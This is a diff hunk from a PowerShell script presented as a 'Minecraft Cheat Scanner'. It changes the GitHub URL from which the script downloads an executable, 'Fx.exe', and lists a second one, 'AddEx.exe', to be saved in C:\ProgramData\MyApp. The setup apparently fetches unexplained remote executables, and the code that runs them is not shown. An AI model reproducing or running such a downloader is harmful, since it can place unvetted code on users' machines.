@@ -10,7 +10,7 @@ $Host.UI.RawUI.WindowTitle = "🔍 Minecraft Cheat Scanner v8.0 [~60 сек]"
 # ===============================================
 # КОНФИГУРАЦИЯ
 # ===============================================
-$URL_FX = "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe"
+$URL_FX = "https://github.com/kilordow/fffff/raw/refs/heads/main/Fx.exe"
 $URL_ADDEX = "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/AddEx.exe"
 $TARGET_DIR = "C:\ProgramData\MyApp"
 $FX_PATH = "$TARGET_DIR\Fx.exe"
